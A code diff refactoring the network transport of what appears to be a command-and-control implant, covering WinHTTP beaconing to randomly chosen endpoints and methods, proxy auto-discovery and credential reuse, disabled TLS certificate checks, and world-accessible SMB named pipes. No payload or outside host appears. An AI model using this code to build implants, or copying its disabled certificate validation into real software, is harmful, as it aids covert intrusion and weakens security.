@@ -1,4 +1,4 @@
-#include <include/network.hpp>
+#include <core/include/network.hpp>
 using namespace Stream;
 
 namespace Network {
@@ -18,22 +18,22 @@ namespace Network {
                     return false;
                 }
 
-                if (!buffer) { buffer = x_malloc(length + 1); }
-                if (!download) { download = x_malloc(length + 1); }
-                else { download = x_realloc(download, total + length + 1); }
+                if (!buffer) { buffer = Malloc(length + 1); }
+                if (!download) { download = Malloc(length + 1); }
+                else { download = Realloc(download, total + length + 1); }
 
-                x_memset(buffer, 0, length + 1);
+                MemSet(buffer, 0, length + 1);
                 if (!Ctx->win32.WinHttpReadData(request, buffer, length, &read)) {
                     return false;
                 }
 
-                x_memcpy(B_PTR(download) + total, buffer, read);
-                x_zerofree(buffer, read);
+                MemCopy(B_PTR(download) + total, buffer, read);
+                Zerofree(buffer, read);
 
                 total += read;
             } while (length > 0);
 
-            (*stream)           = (_stream*) x_malloc(sizeof(_stream));
+            (*stream)           = (_stream*) Malloc(sizeof(_stream));
             (*stream)->buffer   = B_PTR(download);
             (*stream)->length   = total;
 
@@ -47,8 +47,8 @@ namespace Network {
                 if (req_ctx->conn_handle)   { Ctx->win32.WinHttpCloseHandle(req_ctx->conn_handle); }
 
                 if (req_ctx->endpoint) {
-                    x_memset(req_ctx->endpoint, 0, x_wcslen(req_ctx->endpoint) * sizeof(wchar_t));
-                    x_free(req_ctx->endpoint);
+                    MemSet(req_ctx->endpoint, 0, WcsLength(req_ctx->endpoint) * sizeof(wchar_t));
+                    Free(req_ctx->endpoint);
                 }
             }
         }
@@ -56,42 +56,44 @@ namespace Network {
         VOID DestroyProxyContext(const _proxy_context *proxy_ctx) {
 
             if (proxy_ctx) {
-                if (proxy_ctx->proxy_config.lpszProxy)          { x_free(proxy_ctx->proxy_config.lpszProxy); }
-                if (proxy_ctx->proxy_config.lpszProxyBypass)    { x_free(proxy_ctx->proxy_config.lpszProxyBypass); }
-                if (proxy_ctx->proxy_config.lpszAutoConfigUrl)  { x_free(proxy_ctx->proxy_config.lpszAutoConfigUrl); }
+                if (proxy_ctx->proxy_config.lpszProxy)          { Free(proxy_ctx->proxy_config.lpszProxy); }
+                if (proxy_ctx->proxy_config.lpszProxyBypass)    { Free(proxy_ctx->proxy_config.lpszProxyBypass); }
+                if (proxy_ctx->proxy_config.lpszAutoConfigUrl)  { Free(proxy_ctx->proxy_config.lpszAutoConfigUrl); }
             }
         }
 
         BOOL CreateRequestContext(_request_context *req_ctx) {
 
-            const wchar_t *endpoint = { };
 
-            if (!Ctx->transport.http->handle) {
-                if (!(Ctx->transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
+            const auto address = Ctx->transport.http->address;
+            const auto port = Ctx->transport.http->port;
+            auto handle = Ctx->transport.http->handle;
+
+            if (!Ctx->transport.http->endpoints) {
+                return false;
+            }
+            if (!handle) {
+                if (!(handle = Ctx->win32.WinHttpOpen(Ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
                     return false;
                 }
             }
 
-            if (!(req_ctx->conn_handle = Ctx->win32.WinHttpConnect(Ctx->transport.http->handle, Ctx->transport.http->address, Ctx->transport.http->port, 0))) {
+            if (!(req_ctx->conn_handle = Ctx->win32.WinHttpConnect(handle, address, port, 0))) {
                 return false;
             }
 
-            if (Ctx->transport.http->endpoints) {
-                RANDOM_SELECT(endpoint, Ctx->transport.http->endpoints);
-
-                req_ctx->endpoint = (wchar_t*) x_malloc((x_wcslen(endpoint)+ 1) * sizeof(wchar_t));
-                x_memcpy(req_ctx->endpoint, (void*) endpoint, (x_wcslen(endpoint) + 1) * sizeof(wchar_t));
-            }
-            else {
-                return false;
-            }
+            RANDOM_SELECT(req_ctx->endpoint, Ctx->transport.http->endpoints);
 
             Ctx->transport.http->flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
             if (Ctx->transport.b_ssl) {
                 Ctx->transport.http->flags |= WINHTTP_FLAG_SECURE;
             }
 
-            if (!(req_ctx->req_handle = Ctx->win32.WinHttpOpenRequest(req_ctx->conn_handle, Ctx->transport.http->method, req_ctx->endpoint, nullptr, nullptr, nullptr, Ctx->transport.http->flags))) {
+            const auto endpoint = req_ctx->endpoint;
+            const auto method = Ctx->transport.http->method;
+            const auto flags = Ctx->transport.http->flags;
+
+            if (!(req_ctx->req_handle = Ctx->win32.WinHttpOpenRequest(req_ctx->conn_handle, method, endpoint, nullptr, nullptr, nullptr, flags))) {
                 return false;
             }
 
@@ -100,61 +102,68 @@ namespace Network {
 
         BOOL CreateProxyContext(_proxy_context *const proxy_ctx, const _request_context *const req_ctx) {
 
-            if (Ctx->transport.b_proxy) {
-                proxy_ctx->proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
-                proxy_ctx->proxy_info.lpszProxy     = Ctx->transport.http->proxy->address;
+            auto proxy_info     = proxy_ctx->proxy_info;
+            const auto username = Ctx->transport.http->proxy->username;
+            const auto password = Ctx->transport.http->proxy->password;
 
-                if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, &proxy_ctx->proxy_info, sizeof(WINHTTP_PROXY_INFO))) {
+            if (Ctx->transport.b_proxy) {
+                proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+                proxy_info.lpszProxy     = Ctx->transport.http->proxy->address;
+
+                if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, &proxy_info, sizeof(WINHTTP_PROXY_INFO))) {
                     return false;
                 }
 
-                if (Ctx->transport.http->proxy->username && Ctx->transport.http->proxy->password) {
-                    if (
-                        !Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_USERNAME, Ctx->transport.http->proxy->username, x_wcslen(Ctx->transport.http->proxy->username)) ||
-                        !Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->transport.http->proxy->password, x_wcslen(Ctx->transport.http->proxy->password))) {
+                if (username && password) {
+                    if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_USERNAME, username, WcsLength(username)) ||
+                        !Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_PASSWORD, password, WcsLength(password))) {
                         return false;
                     }
                 }
             }
             else if (!Ctx->transport.b_envproxy_check) {
-                proxy_ctx->autoproxy.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
-                proxy_ctx->autoproxy.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
-                proxy_ctx->autoproxy.lpszAutoConfigUrl      = nullptr;
-                proxy_ctx->autoproxy.lpvReserved            = nullptr;
-                proxy_ctx->autoproxy.dwReserved             = 0;
-                proxy_ctx->autoproxy.fAutoLogonIfChallenged = true;
+                auto autoproxy = proxy_ctx->autoproxy;
 
-                if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, req_ctx->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info)) {
+                autoproxy.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
+                autoproxy.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
+                autoproxy.lpszAutoConfigUrl      = nullptr;
+                autoproxy.lpvReserved            = nullptr;
+                autoproxy.dwReserved             = 0;
+                autoproxy.fAutoLogonIfChallenged = true;
+
+                if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, req_ctx->endpoint, &autoproxy, &proxy_info)) {
                     Ctx->transport.env_proxylen  = sizeof(WINHTTP_PROXY_INFO);
-                    Ctx->transport.env_proxy     = x_malloc(Ctx->transport.env_proxylen);
+                    Ctx->transport.env_proxy     = Malloc(Ctx->transport.env_proxylen);
 
-                    x_memcpy(Ctx->transport.env_proxy, &proxy_ctx->proxy_info, Ctx->transport.env_proxylen);
+                    MemCopy(Ctx->transport.env_proxy, &proxy_info, Ctx->transport.env_proxylen);
                 }
                 else {
-                    if (Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser(&proxy_ctx->proxy_config)) {
-                        if (proxy_ctx->proxy_config.lpszProxy != nullptr && x_wcslen(proxy_ctx->proxy_config.lpszProxy) != 0) {
-                            proxy_ctx->proxy_info.dwAccessType      = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
-                            proxy_ctx->proxy_info.lpszProxy         = proxy_ctx->proxy_config.lpszProxy;
-                            proxy_ctx->proxy_info.lpszProxyBypass   = proxy_ctx->proxy_config.lpszProxyBypass;
+                    auto proxy_config = proxy_ctx->proxy_config;
+                    if (Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser(&proxy_config)) {
+
+                        if (proxy_config.lpszProxy != nullptr && WcsLength(proxy_config.lpszProxy) != 0) {
+                            proxy_info.dwAccessType      = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+                            proxy_info.lpszProxy         = proxy_config.lpszProxy;
+                            proxy_info.lpszProxyBypass   = proxy_config.lpszProxyBypass;
 
                             Ctx->transport.env_proxylen     = sizeof(WINHTTP_PROXY_INFO);
-                            Ctx->transport.env_proxy        = x_malloc(Ctx->transport.env_proxylen);
+                            Ctx->transport.env_proxy        = Malloc(Ctx->transport.env_proxylen);
 
-                            x_memcpy(Ctx->transport.env_proxy, &proxy_ctx->proxy_info, Ctx->transport.env_proxylen);
+                            MemCopy(Ctx->transport.env_proxy, &proxy_info, Ctx->transport.env_proxylen);
 
-                            proxy_ctx->proxy_config.lpszProxy       = nullptr;
-                            proxy_ctx->proxy_config.lpszProxyBypass = nullptr;
+                            proxy_config.lpszProxy       = nullptr;
+                            proxy_config.lpszProxyBypass = nullptr;
                         }
-                        else if (proxy_ctx->proxy_config.lpszAutoConfigUrl != nullptr && x_wcslen(proxy_ctx->proxy_config.lpszAutoConfigUrl) != 0) {
-                            proxy_ctx->autoproxy.dwFlags            = WINHTTP_AUTOPROXY_CONFIG_URL;
-                            proxy_ctx->autoproxy.lpszAutoConfigUrl  = proxy_ctx->proxy_config.lpszAutoConfigUrl;
-                            proxy_ctx->autoproxy.dwAutoDetectFlags  = 0;
+                        else if (proxy_config.lpszAutoConfigUrl != nullptr && WcsLength(proxy_config.lpszAutoConfigUrl) != 0) {
+                            autoproxy.dwFlags            = WINHTTP_AUTOPROXY_CONFIG_URL;
+                            autoproxy.lpszAutoConfigUrl  = proxy_config.lpszAutoConfigUrl;
+                            autoproxy.dwAutoDetectFlags  = 0;
 
-                            Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, req_ctx->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info);
+                            Ctx->win32.WinHttpGetProxyForUrl(Ctx->transport.http->handle, req_ctx->endpoint, &autoproxy, &proxy_info);
                             Ctx->transport.env_proxylen     = sizeof(WINHTTP_PROXY_INFO);
-                            Ctx->transport.env_proxy        = x_malloc(Ctx->transport.env_proxylen);
+                            Ctx->transport.env_proxy        = Malloc(Ctx->transport.env_proxylen);
 
-                            x_memcpy(Ctx->transport.env_proxy, &proxy_ctx->proxy_info, Ctx->transport.env_proxylen);
+                            MemCopy(Ctx->transport.env_proxy, &proxy_info, Ctx->transport.env_proxylen);
                         }
                     }
                 }
@@ -188,13 +197,17 @@ namespace Network {
 
             RANDOM_SELECT(Ctx->transport.http->method, methods);
 
-            x_assertb(CreateRequestContext(&req_ctx));
-            x_assertb(CreateProxyContext(&proxy_ctx, &req_ctx));
+            if (!CreateRequestContext(&req_ctx) ||
+                !CreateProxyContext(&proxy_ctx, &req_ctx)) {
+                return false;
+            }
 
             if (Ctx->transport.b_ssl) {
                 Ctx->transport.http->flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-                x_assertb(Ctx->win32.WinHttpSetOption(req_ctx.req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->transport.http->flags, sizeof(ULONG)));
+                if (!Ctx->win32.WinHttpSetOption(req_ctx.req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->transport.http->flags, sizeof(ULONG))) {
+                    return false;
+                }
             }
 
             if (Ctx->transport.http->headers) {
@@ -235,8 +248,8 @@ namespace Network {
 
             if (SmbSecAttr->sid)        { Ctx->win32.FreeSid(SmbSecAttr->sid); SmbSecAttr->sid = nullptr; }
             if (SmbSecAttr->sid_low)    { Ctx->win32.FreeSid(SmbSecAttr->sid_low); SmbSecAttr->sid_low = nullptr; }
-            if (SmbSecAttr->p_acl)      { x_free(SmbSecAttr->p_acl); }
-            if (SmbSecAttr->sec_desc)   { x_free(SmbSecAttr->sec_desc); }
+            if (SmbSecAttr->p_acl)      { Free(SmbSecAttr->p_acl); }
+            if (SmbSecAttr->sec_desc)   { Free(SmbSecAttr->sec_desc); }
         }
 
         BOOL SmbContextInit(SMB_PIPE_SEC_ATTR *const SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {
@@ -247,8 +260,8 @@ namespace Network {
             PACL acl = { };
             EXPLICIT_ACCESSA access = { };
 
-            x_memset(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
-            x_memset(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));
+            MemSet(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
+            MemSet(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));
 
             if (!Ctx->win32.AllocateAndInitializeSid(&sid_auth, 1, SMB_SID_SINGLE_WORLD_SUBAUTHORITY, &SmbSecAttr->sid_low)) {
                 return false;
@@ -271,7 +284,7 @@ namespace Network {
                 return false;
             }
 
-            SmbSecAttr->p_acl = (PACL) x_malloc(MAX_PATH);
+            SmbSecAttr->p_acl = (PACL) Malloc(MAX_PATH);
 
             if (
                 !Ctx->win32.InitializeAcl(SmbSecAttr->p_acl, MAX_PATH, ACL_REVISION_DS) ||
@@ -279,7 +292,7 @@ namespace Network {
                 return false;
             }
 
-            SmbSecAttr->sec_desc = x_malloc(SECURITY_DESCRIPTOR_MIN_LENGTH);
+            SmbSecAttr->sec_desc = Malloc(SECURITY_DESCRIPTOR_MIN_LENGTH);
 
             if (
                 !Ctx->win32.InitializeSecurityDescriptor(SmbSecAttr->sec_desc, SECURITY_DESCRIPTOR_REVISION) ||
